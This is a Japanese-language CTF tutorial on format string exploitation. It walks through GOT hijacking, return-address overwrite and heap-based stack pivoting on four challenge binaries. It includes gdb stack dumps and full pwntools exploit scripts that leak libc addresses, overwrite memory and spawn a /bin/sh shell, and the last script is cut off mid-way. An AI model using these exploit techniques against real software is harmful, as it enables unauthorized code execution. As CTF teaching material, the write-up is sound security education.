# 例

ここでは、CTF の書式文字列脆弱性の問題をいくつか紹介します。いずれも書式文字列のよくある利用方法です。

## 64 ビットプログラムの書式文字列脆弱性

### 原理

実は 64 ビットでのオフセットの計算は 32 ビットと似ており、どちらも対応する引数を数えます。ただし 64 ビットでは、関数の最初の 6 個の引数は対応するレジスタに格納されます。では書式文字列脆弱性ではどうなるでしょうか。対応するレジスタにデータを入れていなくても、プログラムは書式文字列の対応する書式に従ってそれを解釈します。

### 例

ここでは 2017 年の UIUCTF の [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2017-UIUCTF-pwn200-GoodLuck) を例に紹介します。ローカル環境しかないため、ローカルに flag.txt ファイルを用意しました。

#### 保護の確認

```shell
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

プログラムでは NX 保護と部分的な RELRO 保護が有効になっていることがわかります。

#### プログラムの解析

プログラムの脆弱性は明らかです。

```C
  for ( j = 0; j <= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }
```

#### オフセットの確認

printf にブレークポイントを置き、次のようになりました。ここではコード部分とスタック部分だけに注目します。

```shell
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28	printf.c: 没有那个文件或目录.

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8	 ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────


```

flag に対応するスタック上のオフセットは 5 で、最初の行が戻りアドレスなのでそれを除くと、オフセットは 4 です。また、これは 64 ビットプログラムなので、最初の 6 個の引数は対応するレジスタに格納され、fmt 文字列は RDI レジスタに格納されます。したがって fmt 文字列に対応するアドレスのオフセットは 10 です。そして fmt 文字列中の `%order$s` の order は、fmt 文字列の後ろの引数の順番なので、`%9$s` と入力するだけで flag の内容が得られます。もちろん、https://github.com/scwuaptx/Pwngdb の fmtarg を使えば、ある引数のオフセットをもっと簡単に判断できます。

```shell
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```

なお、必ず printf の位置で break する必要があります。

#### プログラムの利用

```python
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
##gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

## hijack GOT

### 原理

現在の C プログラムでは、libc の関数はすべて GOT テーブルを経由してジャンプします。また、RELRO 保護が有効でない場合、各 libc 関数に対応する GOT テーブルのエントリは書き換え可能です。したがって、ある libc 関数の GOT テーブルの内容を別の libc 関数のアドレスに書き換えて、プログラムを制御できます。たとえば、printf の got テーブルのエントリの内容を system 関数のアドレスに書き換えると、プログラムが printf を実行するとき、実際には system 関数が実行されます。

関数 A のアドレスを関数 B のアドレスで上書きするとすると、この攻撃手法は次の手順に分けられます。

-   関数 A の GOT テーブルのアドレスを確定する。

    -   この手順で使う関数 A は、通常プログラム内に既にあるので、単純にアドレスを探す方法で見つけられます。

-   関数 B のメモリアドレスを確定する。

    -   この手順では通常、関数 B のアドレスを自分で何らかの方法で leak する必要があります。

-   関数 B のメモリアドレスを関数 A の GOT テーブルのアドレスに書き込む。

    -   この手順は一般に、関数の脆弱性を利用して発動させる必要があります。一般的な利用方法は次の二つです。

        -   書き込み関数:write 関数。
        -   ROP

        ```text
        pop eax; ret; 			# printf@got -> eax
        pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
        add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
        ```

        -   書式文字列による任意アドレス書き込み

### 例

ここでは 2016 CCTF の [pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2016-CCTF-pwn3) を例に紹介します。

#### 保護の確認

次のとおりです。

```shell
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

プログラムでは主に NX 保護が有効になっていることがわかります。リモートでは通常 ASLR 保護が有効であるものとします。

#### プログラムの解析

まずプログラムを解析すると、パスワードによるログインが必要な ftp のようなものが実装されており、get、put、dir の三つの基本機能があることがわかります。各機能のコードをざっと見ると、get 機能に書式文字列脆弱性があります。

```C
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```

#### 脆弱性利用の方針

書式文字列脆弱性があるので、次のような利用方針を立てられます。

- パスワードを回避する
- 書式文字列の引数のオフセットを確定する
- put@got を利用して put 関数のアドレスを取得し、対応する libc.so のバージョンを特定して、対応する system 関数のアドレスを得る。
- puts@got の内容を system のアドレスに書き換える。
- プログラムが再び puts 関数を実行するとき、実際には system 関数が実行される。

#### 脆弱性利用プログラム

次のとおりです。

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')

## system('/bin/sh')
show_dir()
sh.interactive()
```

注意点は次のとおりです。

- puts 関数のアドレスを取得するときに使ったオフセットは 8 です。これは、出力の最初の 4 バイトが puts 関数のアドレスになるようにしたかったためです。実は書式文字列の先頭アドレスのオフセットは 7 です。
- ここでは pwntools の fmtstr\_payload 関数を使いました。望む結果を簡単に得られます。興味のある方は公式ドキュメントを見て試してみてください。たとえばここでの fmtstr\_payload(7, {puts\_got: system\_addr}) は、書式文字列のオフセットが 7 で、puts\_got のアドレスに system\_addr のアドレスを書き込みたい、という意味です。デフォルトではバイト単位で書き込みます。

## hijack retaddr

### 原理

理解しやすいと思います。書式文字列脆弱性を利用して、プログラムの戻りアドレスを、実行させたいアドレスに奪取します。

### 例

ここでは [三个白帽-pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/三个白帽-pwnme_k0) を例に解析します。

#### 保護の確認

```shell
➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

プログラムでは主に NX 保護と Full RELRO 保護が有効になっていることがわかります。これでは、プログラムの got テーブルを書き換えることはできません。

#### プログラムの解析

簡単に解析すると、プログラムはアカウント登録のような機能を主に実装しており、変更と表示の機能があるようです。そして表示機能に書式文字列脆弱性が見つかります。

```C
int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a4 + 4);
}
```

出力される内容は &a4 + 4 です。さかのぼってみると、読み込んだ password の内容も同じ場所に入ることがわかります。

```C
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
```

さらに、username と password の間の距離が 20 バイトであることもわかります。

```C
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &bufa, 0x14uLL);
  if ( v8 && v8 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;
```

これでおおよそ十分です。また、このアカウントとパスワードには、実はペアが合っているかどうかの確認がないこともわかります。

#### 利用の方針

最終的な目的はシステムの shell を得ることです。与えられたファイルを見ると、0x00000000004008A6 のアドレスに system('bin/sh') を直接呼び出す関数があります(これの発見は、一般にプログラムをざっと見ておくことで行います)。ある関数の戻りアドレスをこのアドレスに書き換えれば、shell を得たことになります。

戻りアドレスを格納しているメモリ自体は動的に変わりますが、rbp からの相対アドレスは変わらないので、相対アドレスで計算できます。利用の方針は次のとおりです。

- オフセットを確定する
- 関数の rbp と戻りアドレスを取得する
- 相対オフセットから、戻りアドレスを格納しているアドレスを求める
- system 関数を呼び出すアドレスを、戻りアドレスを格納しているアドレスに書き込む。

#### オフセットの確定

まずオフセットを確定します。ユーザー名に aaaaaaaa を入力し、パスワードは適当に入力して、パスワードを出力する printf(&a4 + 4) の関数にブレークポイントを置きます。

```text
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
...
```

このときのスタックの状態は次のとおりです。

```text
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x400b1a                  call   0x400758
     0x400b1f                  lea    rdi, [rbp+0x10]
     0x400b23                  mov    eax, 0x0
 →   0x400b28                  call   0x400770
   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
        0x400776                  xchg   ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
        0x40077e                  xchg   ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

入力したユーザー名がスタック上の 3 番目の位置にあることがわかります。書式文字列自体の位置を除くと、オフセットは 5 + 3 = 8 です。

#### アドレスの書き換え

ブレークポイントでのスタックの情報をもう少し詳しく見てみましょう。

```text
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

スタック上の 2 番目の位置に、この関数の戻りアドレスが格納されています(実際には、show account 関数を呼び出したときの push rip で格納された値です)。書式文字列でのオフセットは 7 です。

同時に、スタック上の最初の要素には、一つ前の関数の rbp が格納されています。したがって、オフセット 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38 が得られます。rbp の値がわかれば、関数の戻りアドレスのアドレスがわかります。

0x0000000000400d74 と 0x00000000004008A6 は下位 2 バイトしか違わないので、0x00007fffffffdb48 から始まる 2 バイトだけを書き換えればよいです。

なお、一部の比較的新しいシステム(ubuntu 18.04 など)では、戻りアドレスを直接 0x00000000004008A6 に書き換えるとプログラムがクラッシュすることがあります。その場合は、戻りアドレスを 0x00000000004008AA、つまり system("/bin/sh") を直接呼び出す位置に書き換えることを検討できます。

```assembly
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn
```

#### 利用プログラム
```python
from pwn import *
context.log_level="debug"
context.arch="amd64"

sh=process("./pwnme_k0")
binary=ELF("pwnme_k0")
#gdb.attach(sh)

sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
ret_addr = int(sh.recvline().strip(),16) - 0x38
success("ret_addr:"+hex(ret_addr))


sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
#sh.writeline("%2214d%8$hn")
#0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")

sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()
```

## ヒープ上の書式文字列脆弱性

### 原理

ヒープ上の書式文字列とは、書式文字列自体がヒープに格納されているものを指します。主に、対応するオフセットを得る難易度が上がりますが、一般にこの書式文字列はスタックにコピーされている可能性が高いです。

### 例

ここでは 2015 年 CSAW の [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/fmtstr/2015-CSAW-contacts) を例に紹介します。

#### 保護の確認

```shell
➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

プログラムでは NX 保護だけでなく Canary も有効になっていることがわかります。

#### プログラムの解析

プログラムをざっと見ると、名前のとおり連絡先に関するプログラムで、連絡先の情報の作成、変更、削除、表示ができます。さらに詳しく読むと、連絡先の情報を表示するときに書式文字列脆弱性があることがわかります。

```C
int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}
```

よく見ると、この format は実はヒープ内を指していることがわかります。

#### 利用の方針

基本的な目的は、システムの shell を得て flag を取ることです。書式文字列脆弱性があるのですから、got を奪取するか、プログラムの戻りアドレスを制御して、プログラムの流れを制御できるはずです。しかしここではあまり現実的ではありません。理由はそれぞれ次のとおりです。

- got を奪取してプログラムの流れを制御できないのは、プログラム内で、こちらが与えた文字列を出力できる一般的な関数が printf だけだからです。printf を選んではじめて /bin/sh を組み立てて system('/bin/sh') を実行させられますが、printf 関数はほかの場所でも使われているため、そうするとプログラムがそのままクラッシュしてしまいます。
- 次に、プログラムの戻りアドレスを直接制御してプログラムの流れを制御できないのは、内容を格納できる、直接実行可能なアドレスのブロックがないためです。また、書式文字列でスタックに直接 system\_addr + 'bbbb' + addr of '/bin/sh‘ を書き込むのも現実的ではなさそうです。


ではどうすればよいでしょうか。以前、スタックオーバーフローの章で述べたテクニック stack pivoting があります。そしてここで制御できるのはちょうどヒープメモリなので、スタックをヒープに移せます。ここでは leave 命令でスタックの移動(pivot)を行うため、移動の前に、プログラムが保存している ebp の値を、望む値に書き換えておく必要があります。そうして初めて、leave 命令の実行時に esp が望む値になります。また、書き換えには書式文字列を使うので、保存されている ebp のアドレスが何であるかを知る必要があります。ところが PrintInfo 関数内で ebp を格納しているアドレスは毎回変わり、ほかの方法でも知ることができません。しかし、**プログラムでスタックに積まれた ebp の値は、実際には一つ前の関数の保存された ebp 値のアドレスです**。そのため、**上位の関数が保存している ebp の値、つまり上上位の関数(main 関数)の ebp の値**を書き換えられます。こうすれば、上位のプログラムが return するとき、スタックをヒープに移す操作が実現します。

基本的な方針は次のとおりです。

-   まず system 関数のアドレスを取得する
    -   ある libc 関数のアドレスを leak し、libc database で特定する。
-   基本の連絡先の description を system\_addr + 'bbbb' + binsh\_addr として組み立てる
-   上位の関数が保存している ebp(つまり上上位の関数の ebp)を、**system\_addr を格納しているアドレス - 4** に書き換える。
-   メインプログラムが return するとき、次の操作が行われる
    -   move esp,ebp で、esp を system\_addr のアドレス - 4 に向ける
    -   pop ebp で、esp を system\_addr に向ける
    -   ret で、eip を system\_addr に向け、shell を得る。

#### 関連するアドレスとオフセットの取得

ここでは主に、system 関数のアドレス、/bin/sh のアドレス、スタック上で連絡先の description を格納しているアドレス、そして PrintInfo 関数のアドレスを取得します。

まず、スタックに格納されている libc\_start\_main\_ret のアドレス(main 関数が return するときに実行される関数のアドレス)から、system 関数のアドレスと /bin/sh のアドレスを取得します。対応する連絡先を作成し、連絡先の情報を出力するように選択し、printf にブレークポイントを置いて、書式文字列脆弱性のある printf 関数まで実行を進めます。次のとおりです。

```shell
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
[#1] 0x8048c27 → leave 
[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
[#3] 0x80487a2 → jmp 0x80487b3
[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
[#5] 0x80485e1 → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  dereference $esp 140
['$esp', '140']
1
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
gef➤  dereference $esp l140
['$esp', 'l140']
140
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
0xffffcd24│+0x28: 0x00002b67 ("g+"?)
0xffffcd28│+0x2c: 0x0804c410  →  "11111"
0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd3c│+0x40: 0x00000000
0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
0xffffcd44│+0x48: 0x00000000
0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
0xffffcd58│+0x5c: 0x00000050 ("P"?)
0xffffcd5c│+0x60: 0x00000000
0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
0xffffcd64│+0x68: 0x08048288  →  0x00000082
0xffffcd68│+0x6c: 0x00000004
0xffffcd6c│+0x70: 0x0000000a
0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
0xffffcd78│+0x7c: 0x00000000
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
0xffffcd80│+0x84: 0x00000001
0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
```

簡単な判断で、次のことがわかります。

```
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
```

これは __libc_start_main の戻りアドレスを格納しています。さらに fmtarg でオフセットを取得すると 32 であることがわかり、書式文字列に対する相対オフセットは 31 です。

```shell
gef➤  fmtarg 0xffffcd7c
The index of format argument : 32
```

これで、対応するアドレスが得られます。さらに libc-database から対応する libc を特定し、system 関数のアドレスと /bin/sh のアドレスを得られます。

次に、スタック上で書式文字列を格納しているアドレス 0xffffcd2c の、書式文字列に対するオフセットが 11 であると確定できます。これを得るのは、ヒープ内で指定した連絡先の Description のメモリ先頭アドレスを求めるためです。書式文字列 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] を、指定した連絡先の Description に保存します。

さらに、下のアドレスに上位の関数の呼び出しアドレスが保存されており、書式文字列に対するオフセットは 6 であることがわかります。これで、上位の関数が保存している ebp の値を直接書き換えられます。

```shell
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
```

#### 連絡先を作成してヒープアドレスを取得する

上記の情報がわかれば、次の方法でヒープアドレスと対応する ebp アドレスを取得できます。

```text
[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
```

これで対応するアドレスを取得できます。後ろの bbbb は、文字列を受け取りやすくするためのものです。

関数呼び出し時に確保されるスタック領域と解放される領域は同じなので、得た ebp アドレスは、再度呼び出しても変わりません。

一部の環境では、system のアドレスに \x00 が含まれ、printf で 0 による切り詰めが起きて二つのアドレスを leak できなくなります。その場合は、payload を次のように変更できます。

```text
[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
```

payload をこのように変更した場合は、heap に 12 のオフセットも加える必要があります。これにより、0 による切り詰めが leak のあとに起きることを保証できます。

#### ebp の書き換え

move 命令で ebp を esp に代入し、さらに pop ebp を実行してから ret 命令が実行されるため、ebp を、system のアドレスを格納している場所 -4 の値に書き換える必要があります。そうすれば pop ebp のあと、esp がちょうど system のアドレスを保存している場所を指し、そこで ret 命令を実行すれば system 関数が実行されます。

書き換えたい ebp の値はすでにわかっており、対応するオフセットが 6 であることもわかっているので、次のような payload を組み立てて対応する値を書き換えられます。

```
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
```

#### shell の取得

書式文字列関数の実行が終わったら、上上位の関数まで抜け出します。5 を入力してプログラムを終了すると ret 命令が実行され、shell が得られます。

#### 利用プログラム

```python
from pwn import *
from LibcSearcher import *
contact = ELF('./contacts')
##context.log_level = 'debug'
if args['REMOTE']:
    sh = remote(11, 111)
else:
    sh = process('./contacts')


def createcontact(name, phone, descrip_len, description):
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)


def printcontact():
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')


## get system addr & binsh_addr
payload = '%31$paaaa'
createcontact('1111', '1111', '111', payload)
printcontact()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.success('get system addr: ' + hex(system_addr))
log.success('get binsh addr: ' + hex(binsh_addr))
##gdb.attach(sh)

## get heap addr and ebp addr
payload = flat([
    system_addr,
    'bbbb',
    binsh_addr,
    '%6$p%11$pcccc',
])
createcontact('2222', '2222', '222', payload)
printcontact()
sh.recvuntil('Description: ')
data = sh.recvuntil('cccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)

## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
##print payload
createcontact('3333', '123456789', '300', payload)
printcontact()
sh.recvuntil('Description: ')
sh.recvuntil('Description: ')
##gdb.attach(sh)
print 'get shell'
sh.recvuntil('>>> ')
##get shell
sh.sendline('5')
sh.interactive()
```
system に 0 の切り詰めが出る場合の exp は次のとおりです。
```python
from pwn import *
context.log_level="debug"
context.arch="x86"

io=process("./contacts")
binary=ELF("contacts")
libc=binary.libc

def createcontact(io, name, phone, descrip_len, description):
	sh=io
	sh.recvuntil('>>> ')
	sh.sendline('1')
	sh.recvuntil('Contact info: \n')
	sh.recvuntil('Name: ')
	sh.sendline(name)
	sh.recvuntil('You have 10 numbers\n')
	sh.sendline(phone)
	sh.recvuntil('Length of description: ')
	sh.sendline(descrip_len)
	sh.recvuntil('description:\n\t\t')
	sh.sendline(description)
def printcontact(io):
	sh=io
	sh.recvuntil('>>> ')
	sh.sendline('4')
	sh.recvuntil('Contacts:')
	sh.recvuntil('Description: ')

#gdb.attach(io)

createcontact(io,"1","1","111","%31$paaaa")
printcontact(io)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
log.success('get libc_start_main addr: ' + hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
system=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search("/bin/sh"))
log.success("system: "+hex(system))
log.success("binsh: "+hex(binsh))

payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
createcontact(io,'2', '2', '111', payload)
printcontact(io)
io.recvuntil('Description: ')
data = io.recvuntil('ccc', drop=True)
data = data.split('0x')
print data
